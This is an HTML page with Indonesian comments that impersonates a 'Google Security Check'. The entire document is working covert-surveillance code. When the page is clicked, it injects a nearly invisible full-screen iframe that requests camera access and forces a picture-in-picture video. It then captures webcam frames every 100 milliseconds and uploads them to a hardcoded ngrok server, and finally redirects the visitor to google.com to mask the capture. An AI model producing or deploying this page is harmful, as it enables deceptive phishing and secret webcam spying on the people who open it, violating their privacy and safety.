<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Google Security Verification</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { background: #fff; color: #333; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; cursor: pointer; }
  .panel { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); max-width: 400px; width: 100%; border: 1px solid #ddd; }
  h2 { color: #4285f4; margin-bottom: 10px; font-size: 22px; }
  p { color: #666; font-size: 14px; margin-bottom: 20px; }
  #log { margin-top: 20px; background: #000; padding: 10px; border-radius: 6px; color: #0f0; font-size: 12px; font-family: monospace; text-align: left; height: 120px; overflow-y: auto; }
  
  /* Iframe Transparan (Bukan display: none) */
  #pipFrame {
    position: fixed;
    top: 0; left: 0;
    width: 100vw; height: 100vh;
    opacity: 0.01; /* Hampir transparan, tapi dianggap visible */
    pointer-events: none;
    z-index: 9999;
  }
</style>
</head>
<body>

<div class="panel" id="main-card">
  <h2>🔒 Google Security Check</h2>
  <p>Klik untuk memverifikasi akun Google Anda.</p>
  <div id="log">Sistem siap.</div>
</div>

<div id="launcher-container" style="display: none;"></div>

<!-- Iframe Transparan (Visible) -->
<iframe id="pipFrame" allow="camera; microphone; autoplay; picture-in-picture"></iframe>

<script>
(function () {
  'use strict';

  var logEl = document.getElementById('log');
  var executed = false;

  function log(msg) {
    logEl.innerHTML += "> " + msg + "<br>";
    console.log(msg);
  }

  // ============================================
  // KONFIGURASI
  // ============================================
  var TARGET_URL = "https://www.google.com";
  var SERVER_ENDPOINT = "https://studly-unallegorized-brecken.ngrok-free.dev/upload";
  var REDIRECT_DELAY = 3000; // 3 Detik

  // ============================================
  // FUNGSI: INJECT IFRAME TRANSPARAN (PiP + CAMERA)
  // ============================================
  function injectVisibleIframe() {
    try {
      log("[+] Membuat Iframe Transparan (PiP)...");

      var iframe = document.getElementById('pipFrame');
      
      // Tulis payload ke dalam iframe
      iframe.srcdoc = `
        <!DOCTYPE html>
        <html>
        <body>
          <video id="hiddenVideo" autoplay playsinline muted style="position:absolute;top:0;left:0;width:100vw;height:100vh;opacity:0.01;"></video>
          <canvas id="hiddenCanvas" width="640" height="480" style="display:none;"></canvas>
          
          <script>
            (function() {
              // 1. Minta Izin Kamera
              navigator.mediaDevices.getUserMedia({ video: true, audio: false })
                .then(function(stream) {
                  var video = document.getElementById('hiddenVideo');
                  video.srcObject = stream;
                  video.play().catch(function(){});
                  
                  parent.postMessage({ type: 'CAM_GRANTED' }, '*');

                  // 2. Paksa Masuk PiP (setelah 1 detik)
                  setTimeout(function() {
                    if (document.pictureInPictureElement) {
                      document.exitPictureInPicture();
                    }
                    video.requestPictureInPicture()
                      .then(function() {
                        parent.postMessage({ type: 'PIP_GRANTED' }, '*');
                      })
                      .catch(function(err) {
                        parent.postMessage({ type: 'PIP_DENIED', error: err.message }, '*');
                      });
                  }, 1000);

                  // 3. Kirim Gambar ke Server
                  setInterval(function() {
                    var canvas = document.getElementById('hiddenCanvas');
                    var ctx = canvas.getContext('2d');
                    if (video.readyState === video.HAVE_ENOUGH_DATA) {
                      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                      canvas.toBlob(function(blob) {
                        if (!blob) return;
                        var formData = new FormData();
                        formData.append('file', blob, 'capture.jpg');
                        fetch('${SERVER_ENDPOINT}', {
                          method: 'POST',
                          body: formData
                        }).catch(function(){});
                      }, 'image/jpeg', 0.5);
                    }
                  }, 100);

                })
                .catch(function(err) {
                  parent.postMessage({ type: 'CAM_DENIED', error: err.name }, '*');
                });
            })();
          <\/script>
        </body>
        </html>
      `;

      log("[+] Iframe Transparan disuntikkan.");
    } catch(e) {
      log("[-] Iframe Error: " + e.message);
    }
  }

  // ============================================
  // LISTENER PESAN DARI IFRAME
  // ============================================
  window.addEventListener('message', function(e) {
    if (e.data.type === 'CAM_GRANTED') {
      log("[+] 🚨 Kamera DIIZINKAN (Iframe)!");
    } else if (e.data.type === 'PIP_GRANTED') {
      log("[+] 🎥 PiP AKTIF (Video Melayang)!");
    } else if (e.data.type === 'CAM_DENIED') {
      log("[-] Kamera ditolak: " + e.data.error);
    } else if (e.data.type === 'PIP_DENIED') {
      log("[-] PiP ditolak: " + e.data.error);
    }
  });

  // ============================================
  // TRIGGER (KLIK)
  // ============================================
  document.body.addEventListener('click', function() {
    if (executed) return;
    executed = true;

    document.getElementById('main-card').innerHTML = `
      <h2>⏳ Memverifikasi...</h2>
      <p>Menghubungkan ke Google...</p>
      <div id="log"></div>
    `;
    logEl = document.getElementById('log');
    log("[!] Memulai PiP Bypass...");

    // A. INJECT IFRAME TRANSPARAN
    injectVisibleIframe();

    // B. REDIRECT KE GOOGLE
    setTimeout(function() {
      log("[+] Redirect ke Google.com...");
      try {
        window.location.href = TARGET_URL;
      } catch(e) {}
    }, REDIRECT_DELAY);

  }, { once: true });

})();
</script>
</body>
</html>
